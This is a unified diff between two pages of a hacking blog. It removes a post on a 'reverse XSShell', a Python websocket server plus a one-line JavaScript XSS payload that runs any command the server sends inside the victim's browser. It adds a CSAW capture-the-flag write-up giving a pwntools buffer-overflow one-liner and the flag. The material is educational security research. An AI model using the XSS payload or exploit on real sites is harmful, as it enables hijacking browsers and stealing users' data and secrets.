@@ -17,21 +17,21 @@
     
     
 
-<title>Reverse XSShell • Think
+<title>CSAW - Big boi • Think
 Love
 Share</title>
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Reverse XSShell"/>
-<meta name="twitter:description" content="Having some fun playing with xss and websockets. A different approach to reverse shell and their contexts!"/>
+<meta name="twitter:title" content="CSAW - Big boi"/>
+<meta name="twitter:description" content="Binary exploitation of a dummy command executor, simple buffer overflow of a function&#39;s parameters. "/>
 
-<meta property="og:title" content="Reverse XSShell" />
-<meta property="og:description" content="Having some fun playing with xss and websockets. A different approach to reverse shell and their contexts!" />
+<meta property="og:title" content="CSAW - Big boi" />
+<meta property="og:description" content="Binary exploitation of a dummy command executor, simple buffer overflow of a function&#39;s parameters. " />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://thinkloveshare.com/en/hacking/reverse_xsshell/" />
-<meta property="article:published_time" content="2020-02-22T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-02-22T00:00:00+00:00" />
+<meta property="og:url" content="https://thinkloveshare.com/en/hacking/big_boi/" />
+<meta property="article:published_time" content="2018-09-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2018-09-16T00:00:00+00:00" />
 
 
     
@@ -166,7 +166,7 @@ Share</a>
     </p>
     <div class="langSection">
     
-    <a rel="alternate" href="/en/hacking/reverse_xsshell/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
+    <a rel="alternate" href="/en/hacking/big_boi/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
     </div>
     <p class="copyright">
       &copy; 2021 Laluka.
@@ -182,15 +182,15 @@ Share</a>
             
     <article>
   <header>
-    <h1>Reverse XSShell</h1>
+    <h1>CSAW - Big boi</h1>
     
     
 <div class="post__meta">
     
-      <i class="fas fa-calendar-alt"></i> Feb 22, 2020
+      <i class="fas fa-calendar-alt"></i> Sep 16, 2018
     
     
-    <i class="fas fa-clock"></i> 2 min read
+    <i class="fas fa-clock"></i> 3 min read
     <i class="fas fa-globe"></i> original<br/>
     <i class="fas fa-heart"></i>
     
@@ -204,106 +204,130 @@ Share</a>
   <div class="post">
     
 
-<h1 id="the-initial-idea">The initial idea</h1>
-
-<p>While auditing a website, I found out they were using websockets to transmit data. I didn&rsquo;t kow much about it so I had to <a href="https://rtfm.re/">ReadTheFancyManual</a>. Once I understood that it was&hellip; Well&hellip; A socket one could use with web technologies, I asked myself &ldquo;What do I usually do with sockets?&rdquo;</p>
-
-<p>Tunnels! Transfer files! Or&hellip; Spawn reverse shells?!</p>
-
-<p>Or&hellip; Spawn a reverse XSShell??</p>
-
-<h1 id="what-do-we-need">What do we need?</h1>
-
-<h2 id="a-websocket-server">A websocket server</h2>
-
-<pre><code class="language-python">import asyncio
-import websockets
-
-
-async def hello(websocket, path):
-    print(&quot;WebSocket received&quot;)
-
-    while True:
-        cmd = input(&quot;cmd &gt; &quot;)
-        await websocket.send(cmd)
-        print(f&quot;sent: {cmd}&quot;)
-
-        out = await websocket.recv()
-        print(f&quot;out : {out}\n&quot;)
-
-start_server = websockets.serve(hello, &quot;localhost&quot;, 8080)
-
-asyncio.get_event_loop().run_until_complete(start_server)
-asyncio.get_event_loop().run_forever()
-</code></pre>
-
-<h2 id="some-javascript-to-connect-back">Some javascript to connect back</h2>
-
-<ul>
-<li><p>Readable version</p>
-
-<pre><code class="language-javascript">var socket = new WebSocket(&quot;ws://localhost:8080/&quot;);
-
-socket.onopen = function() {
-console.log(&quot;Connected!&quot;);
-};
-
-socket.onmessage = function(event) {
-console.log(&quot;Cmd received&quot;, event.data);
-socket.send(eval(event.data));
-// socket.close();
-};
-</code></pre></li>
-
-<li><p>Actual payload I use</p>
-
-<pre><code class="language-javascript">s=new WebSocket(&quot;ws://localhost:8080/&quot;),s.onmessage=function(ev){try{s.send(eval(ev.data))}catch(e){s.send(e)}};
-</code></pre></li>
-</ul>
-
-<h2 id="an-html-page-to-execute-the-payload">An html page to execute the payload</h2>
+<h3 id="description">Description</h3>
 
 <blockquote>
-<p>Who cares about html anyway?</p>
+<p>Only big boi pwners will get this one!</p>
+
+<p>nc pwn.chal.csaw.io 9000</p>
 </blockquote>
 
-<h2 id="in-short">In short</h2>
+<p>You can download the ELF <a href="/en/hacking/big_boi/big_boi">here</a></p>
 
-<p>You can find the code here: <a href="https://gitlab.com/TheLaluka/ctf_utils/-/tree/master/web/websocket_xss">https://gitlab.com/TheLaluka/ctf_utils/-/tree/master/web/websocket_xss</a></p>
+<h3 id="tl-dr">TL;DR</h3>
 
-<p>And what this gives us is a reverse shell in a javascript (browser / renderer) context. What you can do from here is up to you.. Try to read files, query the network, mess with your target&rsquo;s DOM or secrets&hellip; Have fun ! :)</p>
+<p>This challenge is a simple buffer overflow with a check that <code>may</code> lead to
+code execution. It&rsquo;s an easy pwn, so one liner is the way to go !</p>
 
-<h1 id="demo">Demo</h1>
+<h3 id="methology">Methology</h3>
 
-<p><img class="img_big" src="/en/hacking/reverse_xsshell/demo.png" alt="demo"></p>
+<p>Step 1 : Use IDA to decompile the program and avoid losing time, then overflow it with the good value many time to access the &ldquo;/bin/bash&rdquo; statement.</p>
 
-<h1 id="limitations">Limitations</h1>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 buf; // [rsp+10h] [rbp-30h]
+  __int64 v5; // [rsp+18h] [rbp-28h]
+  __int64 v6; // [rsp+20h] [rbp-20h]
+  int v7; // [rsp+28h] [rbp-18h]
+  unsigned __int64 v8; // [rsp+38h] [rbp-8h]
 
-<ul>
-<li>You still need an xss with little restrictions (use eval, long payload, &hellip;)</li>
-<li>The reverse xsshell can be blocked on its way back by a firewall / proxy / SOP / CSP / &hellip;</li>
-<li>Blocking actions (alert, prompt, redirect, &hellip;) will break the current shell (trig xss again!)</li>
-</ul>
+  v8 = __readfsqword(0x28u);
+  buf = 0LL;
+  v5 = 0LL;
+  v6 = 0LL;
+  v7 = 0;
+  HIDWORD(v6) = -559038737;
+  puts(&quot;Are you a big boiiiii??&quot;);
+  read(0, &amp;buf, 0x18uLL);
+  if ( HIDWORD(v6) == 0xCAF3BAEE )
+    run_cmd(&quot;/bin/bash&quot;, &amp;buf);
+  else
+    run_cmd(&quot;/bin/date&quot;, &amp;buf);
+  return 0;
+}
+</code></pre>
 
-<h1 id="appendix">Appendix</h1>
+<p>Step 2 : Print the cmd you want to run.</p>
 
-<p>Once again, after spending some time experimenting a new idea, I start google it and&hellip; Well, it&rsquo;s not <em>really</em> something new. It&rsquo;s just about re-discovering <a href="https://github.com/raz-varren/xsshell">what others found before</a>. That being said, I love one-liners and keeping things as simple as possible, so it&rsquo;s not the same-same.. :)</p>
+<pre><code class="language-bash">python2 -c 'from pwn import *; print p32(0xCAF3BAEE) * 6; print &quot;cat flag.txt&quot;' | nc pwn.chal.csaw.io 9000
+</code></pre>
 
-<p><img class="img_big" src="/en/hacking/reverse_xsshell/same_but_different.gif" alt="same_but_different"></p>
+<p>Step 3 : Enjoy your free points ! Yayyyy ! \o/</p>
+
+<h2 id="the-flag-is-flag-y0u-arrre-th3-bi66est-of-boiiiiis">The flag is : <strong>flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}</strong></h2>
+
+<p>author: &ldquo;Laluka&rdquo;
+title: &ldquo;CSAW - Big boi&rdquo;
+slug: &ldquo;big_boi&rdquo;
+date: 2018-09-16
+status: &ldquo;original&rdquo;</p>
+
+<h2 id="description-exploitation-binaire-d-un-executeur-de-commande-un-peu-naif-simple-buffer-overflow-sur-les-parametres-d-une-fonction">description: &ldquo;Exploitation binaire d&rsquo;un executeur de commande un peu naif, simple buffer overflow sur les parametres d&rsquo;une fonction. &ldquo;</h2>
+
+<h3 id="description-1">Description</h3>
+
+<blockquote>
+<p>Seuls les big boi pwners passeront celui-là !</p>
+
+<p>nc pwn.chal.csaw.io 9000</p>
+</blockquote>
+
+<p>Vous pouvez télécharger le fichier ELF <a href="/en/hacking/big_boi/big_boi">ici</a></p>
+
+<h3 id="tl-dr-1">TL;DR</h3>
+
+<p>Ce challenge est un simple buffer overflow avec une comparaison qui <code>peut</code> conduire à une exécution de code. C&rsquo;est un pwn facile, donc le one-liner est de mise !</p>
+
+<h3 id="methologie">Methologie</h3>
+
+<p>Etape 1 : Utilisez IDA pour décompiler le programme et éviter de perdre du temps, puis overflow au bon endroit avec la bonne valeur répétée pour accéder au code executant &ldquo;/bin/bash&rdquo;.</p>
+
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 buf; // [rsp+10h] [rbp-30h]
+  __int64 v5; // [rsp+18h] [rbp-28h]
+  __int64 v6; // [rsp+20h] [rbp-20h]
+  int v7; // [rsp+28h] [rbp-18h]
+  unsigned __int64 v8; // [rsp+38h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  buf = 0LL;
+  v5 = 0LL;
+  v6 = 0LL;
+  v7 = 0;
+  HIDWORD(v6) = -559038737;
+  puts(&quot;Are you a big boiiiii??&quot;);
+  read(0, &amp;buf, 0x18uLL);
+  if ( HIDWORD(v6) == 0xCAF3BAEE )
+    run_cmd(&quot;/bin/bash&quot;, &amp;buf);
+  else
+    run_cmd(&quot;/bin/date&quot;, &amp;buf);
+  return 0;
+}
+</code></pre>
+
+<p>Etape 2 : Envoyer l&rsquo;overflow et la cmd à exécuter.</p>
+
+<pre><code class="language-bash">python2 -c 'from pwn import *; print p32(0xCAF3BAEE) * 6; print &quot;cat flag.txt&quot;' | nc pwn.chal.csaw.io 9000
+</code></pre>
+
+<p>Etape 3 : Profiter des points gratuits ! Yayyyy ! \o/</p>
+
+<p>Le flag est : <strong>flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}</strong></p>
 
   </div>
   
 
 <div class="post--navigation post--navigation-single">
     
-    <a href="/en/hacking/infosec_made_easy/" class="post--navigation-prev">
+    <a href="/en/hacking/shell_code/" class="post--navigation-prev">
       <i aria-hidden="true" class="fa fa-chevron-left"></i>
-      <span class="navigation-tittle">Infosec made easy</span>
+      <span class="navigation-tittle">CSAW - Shell-&gt;Code</span>
     </a>
     
     
-    <a href="/en/hacking/a_helping_hand/" class="post--navigation-next">
-      <span class="navigation-tittle">A Helping Hand</span>
+    <a href="/en/hacking/algebra/" class="post--navigation-next">
+      <span class="navigation-tittle">CSAW - Algebra</span>
       <i aria-hidden="true" class="fa fa-chevron-right"></i>
     </a>
     
